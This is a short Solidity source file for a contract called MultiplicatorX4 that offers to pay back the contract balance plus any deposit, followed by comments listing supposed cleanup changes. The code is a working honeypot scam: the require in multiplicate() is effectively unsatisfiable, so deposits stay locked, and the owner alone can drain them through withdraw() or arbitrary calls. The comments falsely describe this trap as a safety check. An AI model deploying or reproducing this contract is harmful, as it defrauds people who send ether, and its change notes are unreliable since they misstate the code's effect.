pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }

    function multiplicate(address adr) public payable {
        require(msg.value >= this.balance);
        adr.transfer(this.balance + msg.value);
    }
}

// Changes Made:
// - Renamed Owner to owner to follow Solidity naming conventions
// - Removed unnecessary payable modifier from withdraw function
// - Added require statement to command function to check the return value of the external call
// - Added require statement to multiplicate function to ensure that the contract balance is sufficient before transferring funds